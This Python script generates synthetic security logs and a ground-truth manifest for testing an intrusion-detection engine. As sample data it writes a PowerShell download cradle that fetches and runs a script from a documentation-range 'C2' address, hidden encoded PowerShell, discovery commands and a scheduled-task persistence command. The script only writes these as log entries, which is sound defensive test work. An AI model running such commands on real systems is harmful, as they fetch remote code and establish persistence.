#!/usr/bin/env python3
"""Generate simulated (synthetic) security logs for demos and tests.

Nothing here touches a real system. Every IP outside 10.x / 192.168.x comes from
the reserved documentation ranges (198.51.100.0/24 and 203.0.113.0/24), which
never route on the real internet. The "encoded" PowerShell payload decodes to a
harmless print statement.

Usage (from the project root):
    python scripts/generate_sample_logs.py

Output goes to data/sample_logs/. The output is deterministic (fixed seeds), so
re-running produces identical files.
"""
import base64
import csv
import hashlib
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

OUT_DIR = Path(__file__).resolve().parents[1] / "data" / "sample_logs"

FIELDS = [
    "timestamp", "username", "source_ip", "destination_ip", "destination_port",
    "event_type", "action", "status", "hostname", "process", "command_line",
    "file_hash", "message",
]

DAY = datetime(2026, 9, 14)
SERVER_IP, SERVER_HOST = "10.0.0.10", "SRV-APP01"
DC_IP, DC_HOST = "10.0.0.5", "SRV-DC01"
FILE_IP, FILE_HOST = "10.0.0.20", "SRV-FILE01"
C2_IP = "198.51.100.23"          # documentation range - not a real server
UNUSUAL_IP = "203.0.113.77"      # documentation range - not a real host
BENIGN_WEB_IP = "142.250.183.14"

USERS = {
    "alice": ("10.0.1.21", "WS-ALICE"),
    "bob": ("10.0.1.22", "WS-BOB"),
    "carol": ("10.0.1.23", "WS-CAROL"),
    "dave": ("10.0.1.24", "WS-DAVE"),
}

ENCODED_HARMLESS = base64.b64encode(
    "Write-Output 'simulated benign payload'".encode("utf-16-le")
).decode()
FAKE_HASH = hashlib.sha256(b"simulated-update.exe").hexdigest()


def at(hour, minute, second=0):
    return DAY.replace(hour=hour, minute=minute, second=second)


def ev(ts, user, src, dst, etype, action, status, host,
       process="", cmd="", fhash="", msg="", port=""):
    return {
        "timestamp": ts.strftime("%Y-%m-%d %H:%M:%S"),
        "username": user,
        "source_ip": src,
        "destination_ip": dst,
        "destination_port": port,
        "event_type": etype,
        "action": action,
        "status": status,
        "hostname": host,
        "process": process,
        "command_line": cmd,
        "file_hash": fhash,
        "message": msg,
    }


def failed_logins(rng, start, count, src, user, dst, host):
    """`count` failed logins, 6-11 seconds apart. Returns (events, time_after_last)."""
    events, t = [], start
    for _ in range(count):
        events.append(ev(t, user, src, dst, "LOGIN", "authentication", "FAILED",
                         host, msg="Invalid credentials"))
        t += timedelta(seconds=rng.randint(6, 11))
    return events, t


# --------------------------------------------------------------------------
# Background noise: ordinary staff activity during a working day
# --------------------------------------------------------------------------
def noise(rng):
    events = []
    for user, (ip, host) in USERS.items():
        t = at(8, rng.randint(30, 59), rng.randint(0, 59))
        if rng.random() < 0.4:  # an ordinary typo
            events.append(ev(t, user, ip, SERVER_IP, "LOGIN", "authentication",
                             "FAILED", SERVER_HOST, msg="Invalid credentials"))
            t += timedelta(seconds=rng.randint(10, 40))
        events.append(ev(t, user, ip, SERVER_IP, "LOGIN", "authentication",
                         "SUCCESS", SERVER_HOST, msg="Interactive logon"))
        for _ in range(rng.randint(8, 14)):
            t += timedelta(minutes=rng.randint(3, 40))
            if rng.random() < 0.65:
                proc = rng.choice(["chrome.exe", "outlook.exe", "teams.exe",
                                   "excel.exe", "winword.exe"])
                events.append(ev(t, user, ip, "", "PROCESS", "process_start",
                                 "EXECUTED", host, process=proc,
                                 msg=f"{proc} started"))
            else:
                events.append(ev(t, user, ip, BENIGN_WEB_IP, "NETWORK", "connection",
                                 "ALLOWED", host, process="chrome.exe",
                                 msg="Outbound HTTPS connection", port=443))
    return events


# --------------------------------------------------------------------------
# Scenarios (each returns only its own events; noise is added by the caller)
# --------------------------------------------------------------------------
def scenario_normal(rng):
    """Legitimate admin uses PowerShell - a detector should NOT flag this."""
    return [
        ev(at(10, 29, 12), "admin", "10.0.0.99", SERVER_IP, "LOGIN", "authentication",
           "SUCCESS", SERVER_HOST, msg="Interactive logon"),
        ev(at(10, 30, 5), "admin", "10.0.0.99", "", "PROCESS", "process_start",
           "EXECUTED", SERVER_HOST, process="powershell.exe",
           cmd="powershell.exe Get-Service | Where-Object Status -eq Running",
           msg="Routine service check"),
    ]


def scenario_brute_force(rng):
    """Many failed logins from one IP, no success (attempt only)."""
    events, t = failed_logins(rng, at(10, 15), 30, "192.168.1.77", "svc_backup",
                              FILE_IP, FILE_HOST)
    return events


def scenario_powershell(rng):
    """Office app spawns encoded / download-cradle PowerShell, then calls out."""
    u, ip, host = "carol", *USERS["carol"]
    return [
        ev(at(14, 22, 3), u, ip, "", "PROCESS", "process_start", "EXECUTED", host,
           process="powershell.exe",
           cmd=f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {ENCODED_HARMLESS}",
           msg="Parent process: winword.exe"),
        ev(at(14, 23, 10), u, ip, "", "PROCESS", "process_start", "EXECUTED", host,
           process="powershell.exe",
           cmd=("powershell.exe -ExecutionPolicy Bypass -Command "
                f"\"IEX (New-Object Net.WebClient).DownloadString('http://{C2_IP}/a.ps1')\""),
           msg="Parent process: winword.exe"),
        ev(at(14, 24, 2), u, ip, C2_IP, "NETWORK", "connection", "ALLOWED", host,
           process="powershell.exe", msg="Outbound HTTP connection", port=80),
    ]


def scenario_auth_endpoint(rng):
    """Successful login from an unusual external IP at 3 AM, then discovery commands."""
    u = "bob"
    ev_list = [
        ev(at(3, 12, 40), u, UNUSUAL_IP, SERVER_IP, "LOGIN", "authentication",
           "SUCCESS", SERVER_HOST, msg="Interactive logon from previously unseen source"),
    ]
    for (m, s, cmd) in [(14, 5, "whoami /all"), (15, 20, "net user"),
                        (16, 33, "ipconfig /all")]:
        proc = cmd.split()[0] + ".exe"
        ev_list.append(ev(at(3, m, s), u, UNUSUAL_IP, "", "PROCESS", "process_start",
                          "EXECUTED", SERVER_HOST, process="cmd.exe",
                          cmd=f"cmd.exe /c {cmd}", msg=f"Spawned {proc}"))
    return ev_list


def scenario_attack_chain(rng):
    """Brute force -> success -> PowerShell -> discovery -> C2 traffic -> persistence."""
    src, user = "192.168.1.50", "admin"
    events, t = failed_logins(rng, at(12, 1), 25, src, user, SERVER_IP, SERVER_HOST)
    events.append(ev(t + timedelta(seconds=20), user, src, SERVER_IP, "LOGIN",
                     "authentication", "SUCCESS", SERVER_HOST,
                     msg="Interactive logon after repeated failures"))
    events += [
        ev(at(12, 7, 5), user, src, "", "PROCESS", "process_start", "EXECUTED",
           SERVER_HOST, process="powershell.exe",
           cmd=f"powershell.exe -nop -w hidden -enc {ENCODED_HARMLESS}",
           msg="Encoded PowerShell command"),
        ev(at(12, 8, 10), user, src, "", "PROCESS", "process_start", "EXECUTED",
           SERVER_HOST, process="cmd.exe", cmd="cmd.exe /c whoami /all",
           msg="Account discovery"),
        ev(at(12, 9, 20), user, src, C2_IP, "NETWORK", "connection", "ALLOWED",
           SERVER_HOST, process="powershell.exe",
           msg="Outbound connection to external host", port=4444),
        ev(at(12, 9, 50), user, src, "", "FILE", "file_create", "SUCCESS",
           SERVER_HOST, process="powershell.exe",
           cmd="C:\\Users\\Public\\update.exe", fhash=FAKE_HASH,
           msg="Executable written to public folder"),
        ev(at(12, 10, 20), user, src, C2_IP, "NETWORK", "connection", "ALLOWED",
           SERVER_HOST, process="update.exe",
           msg="Repeated outbound connection (beaconing pattern)", port=4444),
        ev(at(12, 11, 20), user, src, C2_IP, "NETWORK", "connection", "ALLOWED",
           SERVER_HOST, process="update.exe",
           msg="Repeated outbound connection (beaconing pattern)", port=4444),
        ev(at(12, 12, 15), user, src, "", "PROCESS", "process_start", "EXECUTED",
           SERVER_HOST, process="schtasks.exe",
           cmd="schtasks /create /sc onlogon /tn Updater /tr C:\\Users\\Public\\update.exe",
           msg="Scheduled task created"),
    ]
    return events


SCENARIOS = {
    "normal_activity": (scenario_normal, 1),
    "brute_force": (scenario_brute_force, 2),
    "suspicious_powershell": (scenario_powershell, 3),
    "suspicious_auth_endpoint": (scenario_auth_endpoint, 4),
    "attack_chain": (scenario_attack_chain, 5),
}

# Ground truth for testing the detection engine and agents in later phases.
MANIFEST = {
    "normal_activity.csv": {
        "description": "Ordinary staff activity plus a legitimate admin PowerShell command.",
        "expected_incidents": [],
    },
    "brute_force.csv": {
        "description": "30 failed logins from one IP against one account; no success.",
        "expected_incidents": [{"type": "brute_force", "source_ip": "192.168.1.77",
                                "user": "svc_backup", "host": FILE_HOST}],
        "expected_mitre": ["T1110"],
    },
    "suspicious_powershell.csv": {
        "description": "Word spawns encoded / download-cradle PowerShell, then an external connection.",
        "expected_incidents": [{"type": "suspicious_powershell", "user": "carol",
                                "host": "WS-CAROL"}],
        "expected_mitre": ["T1059.001"],
    },
    "suspicious_auth_endpoint.csv": {
        "description": "Successful login from an unseen external IP at 03:12, followed by discovery commands.",
        "expected_incidents": [{"type": "suspicious_authentication", "source_ip": UNUSUAL_IP,
                                "user": "bob", "host": SERVER_HOST}],
        "expected_mitre": ["T1078", "T1033"],
    },
    "attack_chain.csv": {
        "description": "Brute force, successful login, encoded PowerShell, discovery, C2-style traffic, dropped executable, scheduled task.",
        "expected_incidents": [{"type": "attack_chain", "source_ip": "192.168.1.50",
                                "user": "admin", "host": SERVER_HOST}],
        "expected_mitre": ["T1110", "T1059.001", "T1033", "T1071.001", "T1053.005"],
    },
    "security_logs.csv": {
        "description": "Combined dataset: normal noise plus all four attack scenarios (same events as security_logs.json).",
        "expected_incidents": "union of the four attack scenarios above",
    },
}


def write_csv(path, events):
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=FIELDS)
        writer.writeheader()
        writer.writerows(events)


def sort_events(events):
    return sorted(events, key=lambda e: e["timestamp"])


def main():
    OUT_DIR.mkdir(parents=True, exist_ok=True)

    combined = noise(random.Random(42))
    for name, (fn, seed) in SCENARIOS.items():
        scenario_events = fn(random.Random(seed + 100))
        events = noise(random.Random(seed)) + scenario_events
        write_csv(OUT_DIR / f"{name}.csv", sort_events(events))
        combined += scenario_events

    combined = sort_events(combined)
    write_csv(OUT_DIR / "security_logs.csv", combined)
    with open(OUT_DIR / "security_logs.json", "w", encoding="utf-8") as f:
        json.dump(combined, f, indent=1)

    # Header-less file matching the short example format from the project brief.
    with open(OUT_DIR / "spec_example_no_header.csv", "w", encoding="utf-8") as f:
        f.write(
            "12:01,admin,192.168.1.50,server,LOGIN,authentication,FAILED\n"
            "12:02,admin,192.168.1.50,server,LOGIN,authentication,FAILED\n"
            "12:03,admin,192.168.1.50,server,LOGIN,authentication,FAILED\n"
            "12:06,admin,192.168.1.50,server,LOGIN,authentication,SUCCESS\n"
            "12:07,admin,192.168.1.50,server,PROCESS,powershell,EXECUTED\n"
        )

    with open(OUT_DIR / "manifest.json", "w", encoding="utf-8") as f:
        json.dump(MANIFEST, f, indent=2)

    print(f"Wrote {len(list(OUT_DIR.iterdir()))} files to {OUT_DIR}")
    print(f"Combined dataset: {len(combined)} events")


if __name__ == "__main__":
    main()
